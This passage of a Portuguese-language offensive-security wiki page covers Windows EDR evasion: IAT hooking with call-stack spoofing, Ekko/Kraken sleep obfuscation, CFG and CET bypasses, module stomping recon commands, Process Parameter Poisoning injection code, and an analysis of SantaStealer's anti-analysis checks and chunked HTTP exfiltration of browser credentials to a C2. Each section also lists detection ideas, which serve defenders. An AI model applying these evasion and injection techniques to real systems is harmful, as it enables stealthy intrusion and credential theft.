// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso da import. Reflective loaders como TitanLdr/AceLdr demonstram hooking durante o DllMain do módulo carregado.
- Mantenha os wrappers pequenos e seguros para PIC; resolva a API verdadeira usando o valor original da IAT capturado antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas graváveis+executáveis.

Call‑stack spoofing stub
- Stubs PIC no estilo Draugr constroem uma call chain falsa (return addresses dentro de módulos benignos) e então fazem pivot para a API real.
- Isso neutraliza detecções que esperam stacks canônicas de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para aterrissar dentro dos frames esperados antes do prólogo da API.

Integração operacional
- Prepend o reflective loader aos post‑ex DLLs para que o PIC e os hooks sejam inicializados automaticamente quando a DLL for carregada.
- Use um Aggressor script para registrar as APIs-alvo, permitindo que Beacon e BOFs se beneficiem transparentemente do mesmo caminho de evasão sem alterações no código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que resolvem para endereços não pertencentes a imagens (heap/anônimos); verificação periódica dos ponteiros de import.
- Anomalias na stack: return addresses que não pertencem a imagens carregadas; transições abruptas para PIC não pertencente a imagens; ancestralidade RtlUserThreadStart inconsistente.
- Telemetria do loader: escritas na IAT dentro do processo, atividade inicial no DllMain que modifica import thunks, regiões RX inesperadas criadas durante o carregamento.
- Evasão de image-load: se houver hooking de LoadLibrary*, monitore carregamentos suspeitos de assemblies de automação/clr correlacionados com eventos de memory masking.

Building blocks e exemplos relacionados
- Reflective loaders que realizam patching da IAT durante o carregamento (por exemplo, TitanLdr, AceLdr)
- Hooks de memory masking (por exemplo, simplehook) e PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (por exemplo, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks de IAT em import-time via um PICO residente

Se você controla um reflective loader, pode fazer hook das imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver customizado que verifica os hooks primeiro:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construa um **PICO residente** (objeto PIC persistente) que sobreviva depois que o PIC transiente do loader liberar a si próprio.
- Exporte uma função `setup_hooks()` que sobrescreva o resolver de imports do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore imports por ordinal e use uma busca de hooks baseada em hash, como `__resolve_hook(ror13hash(name))`. Se existir um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre os alvos de hook em link time com entradas `addhook "MODULE$Func" "hook"` do Crystal Palace. O hook permanece válido porque está dentro do PICO residente.

Isso produz **redirecionamento da IAT em import-time** sem fazer patching da seção de código da DLL carregada após o load.

### Forçando imports que permitam hooking quando o alvo usa PEB-walking

Hooks em import-time só são acionados se a função estiver realmente na IAT do alvo. Se um módulo resolver APIs por meio de PEB-walk + hash (sem entrada de import), force uma import real para que o caminho `ProcessImports()` do loader a encontre:

- Substitua a resolução de exports por hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emitirá uma entrada na IAT, permitindo a interception quando o reflective loader resolver as imports.

### Sleep/idle obfuscation no estilo Ekko sem fazer patching de `Sleep()`

Em vez de fazer patch de `Sleep`, faça hook dos **primitivos reais de wait/IPC** usados pelo implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits longos, envolva a chamada em uma chain de obfuscation no estilo Ekko que criptografe a imagem em memória durante o idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamem `NtContinue` com frames `CONTEXT` preparados.
- Chain típica (x64): defina a imagem como `PAGE_READWRITE` → faça RC4 encrypt via `advapi32!SystemFunction032` sobre toda a imagem mapeada → execute o blocking wait → faça RC4 decrypt → **restaure as permissões por seção** percorrendo as seções PE → sinalize a conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` de template; clone-o em múltiplos frames e defina os registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada etapa.

Detalhe operacional: retorne “success” para waits longos (por exemplo, `WAIT_OBJECT_0`) para que o caller continue enquanto a imagem estiver mascarada. Esse padrão oculta o módulo dos scanners durante as janelas de idle e evita a assinatura clássica de “`Sleep()` com patch”.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- Uso de `advapi32!SystemFunction032` em buffers grandes e contíguos do tamanho de uma imagem.
- `VirtualProtect` em grandes ranges seguido de restauração customizada das permissões por seção.

### Registro de CFG em runtime para gadgets de sleep-obfuscation

Em alvos com CFG habilitado, o primeiro salto indireto para um gadget no meio de uma função, como `jmp [rbx]` ou `jmp rdi`, normalmente fará o processo falhar com `STATUS_STACK_BUFFER_OVERRUN`, pois o gadget não está presente nos metadados de CFG do módulo. Para manter chains no estilo Ekko/Kraken ativas dentro de processos hardened:<sup>[[30]](#references)</sup>

- Registre cada destino indireto usado pela chain com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de imagens carregadas (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` deve começar na **base da imagem** e abranger o **tamanho completo da imagem**.
- Para regiões manualmente mapeadas/PIC/stomped, use a **base da alocação** e o tamanho da alocação.
- Marque não apenas o dispatch gadget, mas também os exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) e quaisquer seções executáveis controladas pelo atacante que se tornarão destinos indiretos.

Isso transforma chains de sleep no estilo ROP/JOP de algo que “funciona apenas em processos sem CFG” em um primitive reutilizável para `explorer.exe`, browsers, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### Stack spoofing compatível com CET para threads em sleep

A substituição completa de `CONTEXT` é ruidosa e pode falhar em sistemas com CET Shadow Stack, pois um `Rip` spoofed ainda precisa concordar com a shadow stack de hardware. Um padrão mais seguro de sleep-masking é:<sup>[[30]](#references)</sup>

- Escolha outra thread no mesmo processo e leia os limites da stack do `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do TEB/TIB real da thread atual.
- Capture o contexto real da thread em sleep com `GetThreadContext`.
- Copie **apenas** o `Rip` real para o contexto spoof, deixando o `Rsp`/estado da stack spoofed intacto.
- Durante a janela de sleep, copie o `NT_TIB` da thread spoof para o TEB atual, para que os stack walkers façam unwind dentro de um range de stack legítimo.
- Depois que o wait terminar, restaure o TIB original e o contexto da thread.

Isso preserva um instruction pointer consistente com CET enquanto engana os stack walkers de EDR que confiam nos metadados de stack do TEB para validar os unwinds.

### Alternativa baseada em APC: Kraken Mask

Se o dispatch por timer queue tiver assinaturas muito conhecidas, a mesma sequência de sleep-encrypt-spoof-restore pode ser executada a partir de uma helper thread suspensa usando APCs enfileiradas:<sup>[[27]](#references)</sup>

- Crie uma helper thread com `NtTestAlert` como entrypoint.
- Enfileire frames `CONTEXT`/APCs preparados com `NtQueueApcThread` e processe-os com `NtAlertResumeThread`.
- Armazene o estado da chain no heap em vez da stack da helper, para evitar esgotar a stack padrão de 64 KB da thread.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o evento de início e bloquear.
- Suspenda a thread principal antes de restaurar o TIB/contexto (`NtSuspendThread` → restore → `NtResumeThread`) para reduzir a race window na qual um scanner poderia capturar uma stack parcialmente restaurada.

Isso troca a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de helper-thread/APC, mantendo os mesmos objetivos de RC4 masking e stack-spoofing.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` pouco antes de sleeps, waits ou dispatch de APC.
- `GetThreadContext`/`SetThreadContext` encapsulados em torno de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de escritas diretas nos limites de stack do TEB/TIB da thread atual.
- Chains de `NtQueueApcThread`/`NtAlertResumeThread` que alcancem indiretamente `SystemFunction032`, `VirtualProtect` ou helpers de restauração de permissões de seção.
- Uso repetido de assinaturas curtas de gadgets, como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`), como pivots de dispatch dentro de módulos assinados.


## Precision Module Stomping

Module stomping executa payloads a partir da **seção `.text` de uma DLL já mapeada dentro do processo-alvo**, em vez de alocar memória privada executável óbvia ou carregar uma DLL sacrificial nova. O alvo da sobrescrita deve ser uma **imagem carregada e apoiada em disco** cujo espaço de código possa absorver o payload sem corromper caminhos de código que o processo ainda necessite.<sup>[[1]](#references)[[2]](#references)</sup>

### Seleção confiável do alvo

Fazer stomping ingênuo contra módulos comuns, como `uxtheme.dll` ou `comctl32.dll`, é frágil: a DLL pode não estar carregada no processo remoto, e uma região de código pequena demais fará o processo falhar. Um workflow mais confiável é:

1. Enumere os módulos do processo-alvo e mantenha uma **include list contendo apenas nomes** das DLLs já carregadas.
2. Construa o payload primeiro e registre seu **tamanho exato em bytes**.
3. Faça scan das DLLs candidatas no disco e compare `Misc_VirtualSize` da seção PE **`.text`** com o tamanho do payload. Isso é mais importante que o tamanho do arquivo, pois reflete o tamanho da seção executável **quando mapeada em memória**.
4. Analise a **Export Address Table (EAT)** e escolha o RVA de uma função exportada como offset inicial do stomp.
5. Calcule o **blast radius**: se o payload exceder o limite da função selecionada, ele sobrescreverá exports adjacentes dispostos depois dela na memória.

Helpers típicos de recon/seleção observados em the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos inesperados de imagens.
- Prefira exports que sejam raramente executados pela aplicação-alvo; caso contrário, caminhos normais de código podem atingir os bytes modificados antes ou depois da criação da thread.
- Implants grandes geralmente exigem alterar a incorporação do shellcode de um literal de string para um **array de bytes/inicializador entre chaves**, para que o buffer completo seja representado corretamente no código-fonte do injector.

Detection ideas
- Escritas remotas em **páginas executáveis respaldadas por imagens** (`MEM_IMAGE`, `PAGE_EXECUTE*`), em vez das alocações privadas RWX/RX mais comuns.
- Entry points de export cujo conteúdo em memória não corresponde mais ao arquivo de origem no disco.
- Threads remotas ou pivôs de contexto que iniciam a execução dentro de um export legítimo de uma DLL cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL, seguidas pela criação de uma thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) é uma técnica de **process-injection / EDR-evasion** que evita o caminho clássico de escrita remota (`VirtualAllocEx` + `WriteProcessMemory`). Em vez de copiar bytes para um target já em execução, ela explora o fato de que o Windows **copia parâmetros de inicialização selecionados de `CreateProcessW` para o processo filho** e os armazena em `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Carriers úteis são:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (com `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restrições práticas dos carriers:

- `lpCommandLine` deve apontar para memória **gravável** para `CreateProcessW` e é limitado a **32.767 caracteres Unicode**, incluindo o terminador nulo.
- `lpEnvironment` deve ser um bloco de ambiente Unicode composto por strings sucessivas `NAME=VALUE\0`, terminadas por um `\0` adicional.
- `lpReserved` é oficialmente reservado, portanto o mapeamento para `ShellInfo` deve ser tratado como um detalhe de implementação, e não como um contrato documentado estável.

Isso transforma a criação normal de processos no **primitivo de transferência de payload**. O operador cria o processo filho com dados de inicialização controlados pelo atacante e permite que o Windows execute a cópia entre processos.

### Remote lookup flow without remote write APIs

Após a criação do processo filho, resolva o buffer copiado usando primitivas **somente de leitura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obter `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ler o `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Ler `RTL_USER_PROCESS_PARAMETERS`
5. Usar o ponteiro selecionado:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Fluxo mínimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Executando o buffer de parâmetros copiado

A região de parâmetros copiada geralmente é `RW`, não executável. Uma cadeia P3 comum é:

1. Criar o processo normalmente (não suspenso)
2. Tornar a página de parâmetros escolhida executável com `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar o handle da thread principal já retornado em `PROCESS_INFORMATION`
4. Redirecionar a execução com `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescrever `RIP`)

Diferentemente dos workflows clássicos de thread hijacking, isso **não requer** `SuspendThread` / `ResumeThread`; o contexto pode ser alterado diretamente no handle da thread principal retornado.

Isso evita várias APIs comumente monitoradas para injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- frequentemente também `SuspendThread` / `ResumeThread`

### Limitação de null bytes e staged shellcode

Todos os três carriers são **dados de string ou semelhantes a strings**, portanto um payload bruto contendo `0x00` é truncado durante a transferência. Uma solução prática é um **first stage sem null bytes** que reconstrói constantes em runtime e então carrega um second stage arbitrário.

Um padrão simples é a síntese de constantes baseada em XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Isso permite que a primeira etapa construa strings de stack, argumentos de API, caminhos de DLL ou um loader de shellcode de segunda etapa sem incorporar bytes nulos no parâmetro transportado.

### Chamadas de API baseadas em stack a partir da primeira etapa

Quando a primeira etapa precisa chamar APIs como `LoadLibraryA`, ela pode:

- fazer push da string/buffer na stack do alvo
- reservar o **shadow space de 32 bytes do x64**
- definir `RCX`, `RDX`, `R8`, `R9` como constantes ou ponteiros relativos a `RSP`
- manter `RSP` **alinhado a 16 bytes** antes da chamada

Uma segunda etapa pode então ser copiada da stack para uma alocação `PAGE_READWRITE`, alterada para `PAGE_EXECUTE_READ` com `VirtualProtect` e executada, evitando uma alocação RWX direta.

### Ideias de detecção

Boas oportunidades de hunting mencionadas pelos autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` tornando **páginas de parâmetros do processo executáveis**
- essa alteração de proteção seguida por `SetThreadContext` / `NtSetContextThread`
- leituras remotas do `PEB` e, em seguida, de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` excepcionalmente longos ou com alta entropia durante a criação do processo

### Observações

- P3 é uma **técnica de transferência entre processos**, não uma primitive de execução completa por si só: o parâmetro copiado ainda precisa de uma alteração para permissões de execução e de um método de redirecionamento da execução.
- `RtlCreateProcessReflection` / Dirty Vanity foi considerado pelos autores, mas rejeitado porque internamente alcança primitives suspeitas, como `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft do SantaStealer para Evasão Fileless e Roubo de Credenciais

SantaStealer (também conhecido como BluelineStealer) ilustra como info-stealers modernos combinam AV bypass, anti-analysis e acesso a credenciais em um único workflow.<sup>[[24]](#references)</sup>

### Verificação do layout do teclado e atraso de sandbox

- Uma flag de configuração (`anti_cis`) enumera os layouts de teclado instalados por meio de `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, o sample cria um marcador `CIS` vazio e termina antes de executar os stealers, garantindo que nunca seja detonado em locales excluídos e deixando um artefato para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas de `check_antivm`

- A Variant A percorre a lista de processos, calcula o hash de cada nome com um checksum de rotação personalizado e compara o resultado com blocklists incorporadas de debuggers/sandboxes; ela repete o checksum usando o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- A Variant B inspeciona propriedades do sistema (limite mínimo de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar as adições do VirtualBox e realiza verificações de tempo em torno de pausas para identificar single-stepping. Qualquer detecção interrompe a execução antes do lançamento dos módulos.

### Helper fileless + carregamento reflective com ChaCha20 duplo

- A DLL/EXE principal incorpora um helper de credenciais do Chromium que é salvo em disco ou manualmente mapeado na memória; no modo fileless, ele resolve importações/relocations por conta própria, portanto nenhum artefato do helper é gravado.
- Esse helper armazena uma DLL de segundo estágio criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após ambas as passagens, ele carrega o blob de forma reflective (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas do [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- As rotinas do ChromElevator usam process hollowing reflective com direct-syscall para injetar código em um navegador Chromium em execução, herdar as chaves do AppBound Encryption e descriptografar senhas/cookies/cartões de crédito diretamente dos bancos de dados SQLite, apesar do hardening do ABE.


### Coleta modular em memória e exfiltração HTTP em chunks

- `create_memory_based_log` itera sobre uma tabela global de ponteiros para funções `memory_generators` e cria uma thread para cada módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, extensões de navegador etc.). Cada thread grava os resultados em buffers compartilhados e informa a quantidade de arquivos após uma janela de join de aproximadamente 45 s.
- Ao terminar, tudo é compactado com a biblioteca `miniz` vinculada estaticamente como `%TEMP%\\Log.zip`. Em seguida, `ThreadPayload1` aguarda 15 s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, e o último chunk acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## Referências

- [1] [Técnicas avançadas de evasão: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, não há mais passes livres para malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentação](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC com call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nova cadeia de infecção e ofuscação baseada em ConfuserEx para o DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Você deve confiar no seu zero trust? Bypass das verificações de postura do Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abusando de exports encaminhadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventário de Forwarded Exports do Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – referência de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – combatendo EDRs com o suporte do Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – rompendo a camada protetora do Windows Defender com a técnica de redirecionamento de pastas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – referência do comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sob a cortina pura: de RAT a builder e coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer está chegando à cidade: um novo e ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – descriptografia do Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: derrotando malware Node.js com API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: colocando o Adaptix para dormir com o Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscação de sleep do Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – ocultando o Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – abusando do Chrome Remote Desktop em operações de Red Team: um guia prático](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
